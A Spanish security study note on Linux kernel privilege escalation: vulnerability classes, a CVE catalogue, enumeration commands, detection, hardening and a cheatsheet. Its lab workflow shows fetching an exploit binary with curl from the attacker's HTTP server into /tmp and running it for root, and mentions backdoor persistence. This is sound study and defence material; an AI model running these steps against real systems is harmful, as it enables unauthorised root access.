---
aliases:
  - Vulnerabilidades del Kernel
  - Escalada de Privilegios Linux
  - Kernel Exploitation
tags:
  - sec/priv-esc
  - sec/linux
tipo: concepto
estado: terminado
creado: 2026-10-11
actualizado: 2026-10-11
relacionado:
  - "[[Abuso de Docker para Escalada de Privilegios y Escape de Contenedores]]"
  - "[[Linux Capabilities]]"
  - "[[Privilegios SUID en Linux]]"
  - "[[Secuestro de Bibliotecas Compartidas]]"
  - "[[Elevación de Privilegios mediante Explotación de Binarios]]"
  - "[[Abuso de Permisos en Linux y LSE]]"
  - "[[Abuso de Privilegios Sudoers]]"
fuente: "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-kernel-exploitation.html"
---

# Vulnerabilidades del Kernel y Escalada de Privilegios

El **kernel** de Linux administra memoria, procesos, filesystem, red y dispositivos **con los máximos privilegios del sistema**. Cualquier bug alcanzable desde un proceso de usuario (syscall, ioctl, protocolo de red, filesystem montable) es un candidato a **escalada a root**: la frontera usuario/kernel es *la* frontera de seguridad del SO. En auditorías, la vía kernel es el escalón final cuando sudo/SUID/grupos/cron no dieron resultado.

> [!info] Componentes clave del kernel
> Subsistemas cuyos bugs se explotan con frecuencia:
> *   **Scheduler**: reparto de CPU y tiempos (*race windows* para UAF/TOCTOU).
> *   **Administrador de memoria**: allocación de páginas, copy-on-write, GUP (*get_user_pages*) — origen de Dirty COW y Dirty Pipe.
> *   **Sistema de Archivos Virtual (VFS)** y fs montables (overlayfs, FUSE, ntfs-3g) — bugs de permisos/copy-up.
> *   **Netfilter / stack de red** (`nftables`, `AF_PACKET`, DCCP, TIPC) — la cantera más productiva de UAF/double-free (CVE-2021-22555, CVE-2024-1086).
> *   **Drivers / ioctls**: superficie enorme y de código de terceros.
> *   **eBPF / io_uring**: APIs modernas, alto poder y bugs de verificador/gestión de memoria.
> *   **Namespaces y cgroups**: lo que convierte un "bug de container" en root del host (CVE-2022-0492).

## Mecánica: qué es realmente "rootear el kernel"

El kernel corre en modo privilegiado (ring 0) y todos los procesos comparten su espacio. Los exploits de escalada no "rompen el kernel" al estilo usuario: **corrompen una estructura de datos o un flujo de control y luego lo usan para reescribir lo que decide privilegios**. Los tres objetivos clásicos:

| Objetivo | Qué se consigue | Ejemplos |
|---|---|---|
| **`struct cred` del proceso** (`real_cred`/`cred` en `task_struct`) | poner `uid=gid=…=0` en *mi* proceso → **root ya** | DirtyCred (reuso de cred tras free), ret2usr/ROP que lo escriben |
| **`modprobe_path`** (`/proc/sys/kernel/modprobe`) | apuntar el helper de módulos a *mi* script → al fallar un módulo (socket de protocolo desconocido), el kernel **ejecuta mi binario como root** | UAF/write arbitrario → `trigger` con socket `AF_INET` protocolo roto |
| **`core_pattern`** (`\|/ruta/al/script`) | el kernel ejecuta *mi* script como root al crashear un proceso | write arbitrario a la sysctl |

> [!warning] Tipos comunes de vulnerabilidades del kernel
> (además de "solo en kernels viejos" — los modernos siguen teniendo nuevas):
> *   **Desbordamientos de búfer**: escribir más de lo que un búfer puede contener y sobrescribir memoria adyacente (heap del kernel: `kmalloc`).
> *   **Use-After-Free (UAF)**: usar un objeto ya liberado y potencialmente realocado — la clase dominante en netfilter/nftables.
> *   **Double-free**: liberar dos veces → corrupción del *freelist* del slab.
> *   **Condiciones de carrera**: la salida depende del timing entre hilos (Dirty COW: `madvise(DONTNEED)` vs GUP).
> *   **Null pointer dereference**: desreferenciar `NULL`; en kernels viejos con `mmap(0)` explotable (hoy mitigado por `mmap_min_addr=65536`).
> *   **Fugas de información**: leer punteros del kernel → eluden KASLR y permiten ROP dirigido.

Técnicas de explotación (cómo se llega de la corrupción a root):

- **Ret2usr**: redirigir la ejecución del kernel a *shellcode* en espacio de usuario — **bloqueado por SMEP/SMAP** en hardware moderno.
- **ROP (kernel)**: encadenar *gadgets* del propio kernel (saltos/cargas) eludiendo NX; requiere leak de direcciones (KASLR).
- **Corrupción de estructuras**: sobrescribir punteros/cred para cambiar UID/GID a 0 (la vía más directa y la que usan los exploits modernos junto a `modprobe_path`).

## Catálogo de CVEs de escalada (familias clásicas)

| CVE | Nombre | Alcance aproximado | Mecanismo / nota |
|---|---|---|---|
| **CVE-2016-5195** | **Dirty COW** | 2.6.22 → 4.8 (+backports) | carrera `madvise(DONTNEED)` vs *get_user_pages* → escribe sobre mappings de solo-lectura (binarios SUID, `passwd`) |
| **CVE-2022-0847** | **Dirty Pipe** | 5.8 → 5.16.10 | flag `PIPE_BUF_FLAG_CAN_MERGE` sin inicializar en pipes → **sobrescribir páginas de archivos de solo-lectura** (SUID). Requiere un SUID candidato a sobrescribir |
| **CVE-2021-3493** | overlayfs (Ubuntu) | kernels Ubuntu ≤5.11 | `setxattr` sobre overlay montado en user namespace → xattr de caps sin chequeo → root |
| **CVE-2023-0386** | overlayfs copy-up | ≤ 6.2 | copiar con `copy_up` un archivo con caps entre namespaces → root en host (requiere userns sin privilegio) |
| **CVE-2023-2640 / CVE-2023-32629** | **GameOverlay(lay)** | kernels Ubuntu (jul 2023) | overlayfs + userns de Ubuntu → caps sobre archivos del sistema |
| **CVE-2022-0492** | cgroups v1 `release_agent` | ≤ 5.16 (feb 2022) | escribir `release_agent` desde un container con userns → **ejecución como root del host** (escape de container) |
| **CVE-2022-0185** | fsconfig overflow | 5.1 → 5.16.1 | heap overflow en `fsconfig` (legacy_parse_param) vía userns |
| **CVE-2021-22555** | netfilter OOB | 2.6.19 → 5.12 | heap OOB en `xt_compat` (iptables) — el exploit clásico de mirar |
| **CVE-2022-32250** | nftables UAF | ≤ 5.18.1 | UAF en `nft_object` al recrear reglas |
| **CVE-2023-32233** | nftables UAF | ≤ 6.3.1 | UAF en batch de anon sets — root con userns |
| **CVE-2024-1086** | nftables UAF | 3.15 → 6.8-rc1 | UAF doble-free en `nft_verdict` — exploit público muy usado en labs (requiere userns) |
| **CVE-2016-8655** | packet race | ≤ 4.8.12 | carrera en `AF_PACKET` (necesita `CAP_NET_RAW` — ver [[Linux Capabilities]]/userns) |
| **CVE-2017-6074** | DCCP double-free | ≤ 4.9.13 | doble free en DCCP |
| **CVE-2017-7308** | AF_PACKET | ≤ 4.10.6 | overflow en ring buffer de paquetes |
| **CVE-2022-2588** | route4 UAF | 2022 | UAF en `cls_route` (qdisc) |

**Familia Qualys / userspace que toda auditoría revisa junto al kernel** (son SUID, no kernel, pero mismo flujo de trabajo):

| CVE | Nombre | Target |
|---|---|---|
| CVE-2021-4034 | **PwnKit** | `pkexec` (SUID) — ver [[Privilegios SUID en Linux]] |
| CVE-2021-3156 | **Baron Samedit** | `sudo` heap overflow — ver [[Abuso de Privilegios Sudoers]] |
| CVE-2023-4911 | **Looney Tunables** | `ld.so` (`GLIBC_TUNABLES`) en SUID — ver [[Secuestro de Bibliotecas Compartidas]] |
| CVE-2024-48990/91/92 | **needrestart** | el análisis de `needrestart` corre como root y usa **el entorno de procesos de usuario** (`PYTHONPATH` y familia) → carga de código del atacante como root durante upgrades |

## Enumeración: identificar el terreno

```bash
# 1) Versión exacta del kernel (la base de todo)
uname -a; uname -r
cat /proc/version          # + versión de gcc/compilación — pista de backports
cat /etc/os-release        # distro y versión (Ubuntu 22.04, Debian 12…)
hostnamectl | grep -E 'Operating|Kernel'

# 2) Arquitectura y CPU (los exploits deben coincidir)
uname -m                   # x86_64 / i686 / aarch64
lscpu | grep -E 'Architecture|CPU\(s\):'   # nº de cores: carreras afinadas a 1-2 cores
getconf LONG_BIT

# 3) Configuración expuesta
sysctl kernel.randomize_va_space kernel.kptr_restrict kernel.dmesg_restrict \
        kernel.unprivileged_bpf_disabled kernel.unprivileged_userns_clone \
        kernel.yama.ptrace_scope kernel.modules_disabled kernel.io_uring_disabled 2>/dev/null
cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null   # Debian/Ubuntu
cat /sys/kernel/security/lockdown 2>/dev/null                # none/integrity/confidentiality

# 4) Módulos y superficie cargada
lsmod | head -30; cat /proc/modules | awk '{print $1}'
cat /boot/config-$(uname -r) 2>/dev/null | grep -E 'CONFIG_USER_NS|CONFIG_OVERLAY_FS|CONFIG_IKCONFIG|CONFIG_NF_TABLES|CONFIG_SLAB_FREELIST'
zcat /proc/config.gz 2>/dev/null | grep CONFIG_USER_NS      # si IKCONFIG_PROC está activo

# 5) Posición de privilegio de partida (condiciona qué CVE aplican)
id; groups; sudo -l 2>/dev/null
capsh --print 2>/dev/null | head -5        # caps de arranque (p. ej. CAP_NET_RAW → CVEs de red)
```

### Determinar vulnerabilidad: de la versión al exploit

```bash
# a) Búsqueda en BD local
searchsploit linux kernel privilege escalation
searchsploit --cve 2022-0847
searchsploit ubuntu kernel 5.15          # filtrar por distro+versión
searchsploit -w linux kernel local       # -w busca online si la BD local está vieja

# b) Sugeridores automáticos (comparan uname con rangos de CVE)
#   linux-exploit-suggester: https://github.com/mzet-/linux-exploit-suggester
./les.sh

# c) Confirmación manual (SIEMPRE antes de ejecutar):
#   - el CVE aplica al rango de versiones de MI kernel (changelog oficial)
#   - la distro no lo parcheó "silenciosamente" (backport) — comprobar:
apt list --installed 2>/dev/null | grep linux-image     # versión de PAQUETE (5.15.0-91.101)
apt changelog linux-image-$(uname -r) 2>/dev/null | grep -i CVE-2022-0847
#   RHEL: rpm -q --changelog kernel | grep -A2 CVE-2022-0847
```

> [!tip] La pregunta de verificación
> *"¿Mi `uname -r` está en el rango del CVE **y** el parche del vendor no está aplicado?"* — las distros **backportean** parches manteniendo el número base (Ubuntu `5.4.0-150-generic` lleva años de parches). El sugeridor automático es un **triage**, nunca una confirmación.

## Patrón de ejecución de un exploit (lab)

> [!warning] Regla de laboratorio
> Los exploits de kernel son **inestables**: un desajuste de versión, config o timing provoca **panic** del sistema. Ejecutar únicamente en **VM con snapshot**, nunca en el host ni en producción. Este vault documenta los comandos; el execution corresponde al entorno de laboratorio autorizado.

```bash
# 1) COMPILAR en local, contra arquitectura del target
uname -m                                   # debe coincidir con el ELF del target
gcc -o exploit exploit.c -static           # -static: sin dependencia de libc en el target
#  si el exploit incluye cabeceras del kernel:
#    sudo apt install linux-headers-$(uname -r)    (¡en el target, misma versión!)

# 2) TRANSFERIR al target
python3 -m http.server 8000                # en tu equipo
curl http://<tu_ip>:8000/exploit -o /tmp/exploit       # en el target
#  alternativas: base64 -d <<< '…' > /tmp/e ; scp ; cat < /dev/tcp (sin curl)
#  si /tmp está noexec → /var/tmp, ~/ o /dev/shm

# 3) EJECUTAR y verificar
chmod +x /tmp/exploit
/tmp/exploit                               # salida típica: "[+] root"
id                                         # uid=0(root) ⇒ éxito
# 2>/dev/null; ls -l /tmp/exploit... limpiar artefactos tras la prueba

# 4) Flujo cuando NO hay exploit directo
#    combo: CVE de container (overlay/cgroup) → escape → root del host
#    combo: fuga de info (KASLR) + ROP → cred write → root
```

**Qué prueba un exploit antes de decidir**: versión de kernel, existencia de SUID (Dirty Pipe necesita uno), userns habilitado, nº de cores, mitigaciones activas (SMEP/SMAP/KPTI) — la mayoría de exploits modernos los comprueban y salen limpios ("kernel not vulnerable") sin romper nada; los viejos, no.

## Superficie de ataque desde contenedores

Un container **comparte el kernel** del host: cualquier syscall permitida es superficie de ataque contra él.

| Condición | Qué desbloquea |
|---|---|
| `--privileged` / `CAP_SYS_ADMIN` | overlayfs, cgroups, `release_agent` (CVE-2022-0492), mounts → escape |
| User namespaces habilitados | ≈ mitad de los CVEs anteriores son alcanzables **sin privilegios** (nftables, overlay, fsconfig) |
| seccomp desactivado | ioctls/protocols (DCCP, packet) que el perfil por defecto bloquea |
| Kernel viejo del host | el container hereda **todos** sus CVEs — "dentro del container soy root y aún así el host es vulnerable" |

Perfil por defecto de Docker bloquea muchas de estas syscalls vía seccomp; el detalle completo de escapes está en [[Abuso de Docker para Escalada de Privilegios y Escape de Contenedores]].

## Detección (lado defensor)

| Señal | Cómo mirarla |
|---|---|
| Panic/oops/crash | `journalctl -k | grep -iE 'oops|bug|unable to handle|call trace'`; `/var/crash`, kdump (`/var/lib/systemd/coredump`); alerta de disponibilidad = intento fallido |
| Binario de exploit en disco | FIM/EDR: ELF en `/tmp`, `/dev/shm`, `/home` ejecutado y borrado; `auditctl -a always,exit -S execve -F dir=/tmp -k tmp_exec` |
| Ejecución sospechosa de `gcc`/`make` en el servidor | `ausearch -k compile`; builds inesperados en host productivo |
| Carga de módulos inesperada | `ausearch` sobre `finit_module`/`init_module`; diff de `/proc/modules`; `modules_disabled=1` elimina el vector |
| Trigger de `modprobe` anómalo | aparición de `/tmp/...` en logs de `modprobe` (señal de intento de *modprobe_path* overwrite) |
| Escrituras a sysctls críticas | `auditctl -w /proc/sys/kernel/modprobe -p wa`; `…/core_pattern -p wa` |
| needrestart/upgrade con entorno de usuario | parchear; ejecutar upgrades con entorno limpio |

Artefactos típicos: `exploit.c`/`*.ko` en `/tmp`, procesos con `mmap(0)` o `iopl`, floods de `socket(AF_INET, SOCK_RAW/…)` en audit, llamadas fallidas a `unshare`, errores de `fsconfig`/`nft` en logs.

## Impacto

- **Root completo y persistente**: rewrite de `cred` → backdoor (`authorized_keys`, usuario uid 0, cron).
- **Evasión total de DAC/MAC a nivel usuario**: root ignora permisos de archivo; SELinux/AppArmor pueden seguir activos (root ≠ omnipotente si hay MAC estricta).
- **Escape de container** → compromiso del host y del clúster (ripple).
- **Control del kernel**: rootkit (`CAP_SYS_MODULE`/insmod), ocultación de procesos, interceptación de tráfico — ver [[Linux Capabilities]] para la variante "sin bug, con caps".
- **DoS**: el intento fallido deja el host caído — también es impacto.

## Mitigación / sección defensiva

```bash
# 1) PARCHEAR — y entender que el parche NO afecta al kernel en memoria:
apt update && apt full-upgrade -y && reboot     # el reboot es obligatorio…
#  …salvo livepatch, que parchea el kernel en caliente:
#  Ubuntu: canonical-livepatch enable <token> ; RHEL: dnf kpatch-patch ; upstream kpatch
canonical-livepatch status
uname -r                                         # tras livepatch: [patched] en el status

# 2) CERRAR SUPERFICIE POR SYSCTL (persistir en /etc/sysctl.d/)
sysctl -w kernel.unprivileged_userns_clone=0                 # Debian/Ubuntu
sysctl -w user.max_user_namespaces=0                         # genérico (afecta a CVEs userns)
sysctl -w kernel.apparmor_restrict_unprivileged_userns=1     # Ubuntu 23.10+
sysctl -w kernel.unprivileged_bpf_disabled=2                 # mata eBPF sin caps
sysctl -w kernel.io_uring_disabled=2                         # superficie nueva frecuente
sysctl -w kernel.kptr_restrict=2                             # sin punteros kernel
sysctl -w kernel.dmesg_restrict=1                            # sin dmesg → menos leaks
sysctl -w kernel.perf_event_paranoid=2                       # perf sin caps
sysctl -w kernel.yama.ptrace_scope=1                         # ptrace restringido
sysctl -w kernel.modules_disabled=1                          # sin carga de módulos (¡hasta reboot!)
sysctl -w kernel.sysrq=0
sysctl -w fs.protected_hardlinks=1 fs.protected_symlinks=1

# 3) CONFIG DEL KERNEL (hardening)
#    CONFIG_STATIC_USERMODEHELPER=y   → fija el binario de usermode helpers
#                                        (bloquea modprobe_path/core_pattern como objetivo)
#    CONFIG_SECURITY_LOCKDOWN_LSM, init_on_alloc=1/init_on_free=1 (slab hygiene)
#    CONFIG_RANDOMIZE_BASE (KASLR), SMEP/SMAP en CPU + Secure Boot
cat /sys/kernel/security/lockdown     # esperado: [integrity] o confidentiality

# 4) CONTENEDORES (reducir el ataque al kernel compartido)
#    perfil seccomp por defecto ON, NO --privileged, drop CAP_SYS_ADMIN,
#    user namespaces solo donde se necesiten — ver nota Docker

# 5) DETECCIÓN Y RESPUESTA
auditctl -w /proc/sys/kernel/modprobe -p wa -k modprobe_write
auditctl -w /proc/sys/kernel/core_pattern -p wa -k corepattern_write
journalctl -k | grep -iE 'oops|bug:|call trace'   # monitoreo de panics
# + inventario: dpkg/apt changelog de kernel en el plan de parcheo con SLA
```

Resumen de mitigaciones **contra la explotación** (qué dificultan qué):

| Mitigación | Efecto |
|---|---|
| **ASLR** | aleatoriza libs/stack/heap de usuario |
| **KASLR** | aleatoriza la base del kernel → ROP necesita leak |
| **DEP/NX** | no ejecución de páginas de datos (stack/heap) |
| **SMEP** | el kernel no ejecuta páginas de usuario (mata ret2usr) |
| **SMAP** | el kernel no *lee* datos de usuario (completa SMEP) |
| **KPTI** | separa tablas de página usuario/kernel (meltdown/fugas) |
| **slab hardening** | `init_on_alloc/free`, freelist random/hardened → UAF más difícil |
| **SELinux/AppArmor + lockdown** | hasta a root le niegan acciones |
| **Grsecurity/PaX** | parches de hardening upstream-complementarios |

## Errores comunes

1. **Confiar ciegamente en `linux-exploit-suggester`** — backports del vendor hacen **falsos positivos** el 50% de las veces; verificar changelog/paquete (`apt list | grep linux-image`, `rpm -q --changelog kernel`).
2. **Arquitectura equivocada** — compilar en x86_64 y ejecutar en i686 (o al revés): `Exec format error`. Comprobar `uname -m` **en el target**.
3. **Versión "parecida" pero no exacta** — `5.4.0-81` ≠ `5.4.0-150`: un exploit que asume offsets internos de estructuras (`cred`, `task_struct`) falla o pánica si el build no coincide.
4. **Olvidar que parchear no reemplaza al reboot** — el kernel vivo sigue siendo el viejo hasta `reboot` (o livepatch). "Ya lo actualicé" sin reboot = sigue vulnerable.
5. **Explorar sin mirar la config** — userns desactivado, nf_tables ausente o mitigaciones activas invalidan CVEs completos: `searchsploit` no lo dice.
6. **Dirty Pipe sin SUID candidato** — el exploit necesita un binario SUID (u otro archivo de solo-lectura con valor) para sobrescribir; en distros con ~5 SUID la elección importa.
7. **Carreras y nº de cores** — exploits de `AF_PACKET`/Dirty COW afinados a 1-2 cores fallen en hosts de 32; los modernos avisan.
8. **`/tmp` con `noexec`** → `Permission denied` al ejecutar; mover a `/dev/shm` o `$HOME`.
9. **Pánica en producción** — un exploit de kernel en el host productivo es un incidente de disponibilidad; siempre lab/VM primero.
10. **Creer que "root = tener todo"** — con MAC estricta (SELinux enforcing/lockdown) incluso root necesita reglas; y con `modules_disabled`/`STATIC_USERMODEHELPER` se pierden técnicas clásicas de persistencia.
11. **Descartar la vía kernel demasiado pronto** — revisar primero userns + overlay/cgroup (containers) y Dirty Pipe/Dirty COW en kernels con rangos conocidos antes de meterse en ROP.

## Cheatsheet

```bash
# Enumeración
uname -a; uname -r; cat /etc/os-release; uname -m; id; groups
sysctl kernel.unprivileged_userns_clone kernel.unprivileged_bpf_disabled \
       kernel.kptr_restrict kernel.dmesg_restrict 2>/dev/null
lsmod | head; cat /boot/config-$(uname -r) 2>/dev/null | grep -E 'USER_NS|OVERLAY'
apt list --installed 2>/dev/null | grep linux-image      # versión real del paquete

# Determinación
searchsploit linux kernel privilege escalation ; searchsploit --cve 2022-0847
./les.sh                                                  # linux-exploit-suggester
apt changelog linux-image-$(uname -r) | grep -i <CVE>     # confirmar backport

# Ejecución (lab con snapshot)
gcc -o exploit exploit.c -static
python3 -m http.server 8000  ;  curl http://<ip>:8000/exploit -o /tmp/exploit
chmod +x /tmp/exploit && /tmp/exploit && id               # uid=0 ⇒ éxito

# Mitigación
apt full-upgrade -y && reboot          # o: canonical-livepatch
sysctl -w kernel.unprivileged_userns_clone=0 user.max_user_namespaces=0 \
       kernel.unprivileged_bpf_disabled=2 kernel.kptr_restrict=2 \
       kernel.dmesg_restrict=1 kernel.modules_disabled=1
auditctl -w /proc/sys/kernel/modprobe -p wa -k modprobe_write
```

## Referencias

- HackTricks — Kernel exploitation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-kernel-exploitation.html
- PayloadsAllTheThings — Linux kernel: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation
- Exploit Database: https://www.exploit-db.com/  ·  NVD: https://nvd.nist.gov/
- `capabilities`/sysctls y hardening del kernel: https://www.kernel.org/doc/html/latest/admin-guide/sysctl/kernel.html
- linux-exploit-suggester: https://github.com/mzet-/linux-exploit-suggester
- Qualys advisories (PwnKit, Baron Samedit, needrestart): https://www.qualys.com/en-us/security-advisories/
- Notas internas: [[Abuso de Docker para Escalada de Privilegios y Escape de Contenedores]], [[Elevación de Privilegios mediante Explotación de Binarios]]

## Relacionadas

- [[Abuso de Docker para Escalada de Privilegios y Escape de Contenedores]] — ataque al kernel compartido desde dentro
- [[Elevación de Privilegios mediante Explotación de Binarios]] — la misma disciplina de explotación aplicada a bins de usuario
- [[Privilegios SUID en Linux]] — los CVEs userspace (PwnKit, etc.) que acompañan a esta nota
- [[Abuso de Privilegios Sudoers]] — Baron Samedit en contexto
- [[Secuestro de Bibliotecas Compartidas]] — Looney Tunables: el cargador como blanco
- [[Linux Capabilities]] — `CAP_NET_RAW`/`CAP_SYS_ADMIN` como acceso previo a superficies de red/cgroups
- [[Abuso de Permisos en Linux y LSE]] — punto de entrada de la enumeración antes de plantearte el kernel
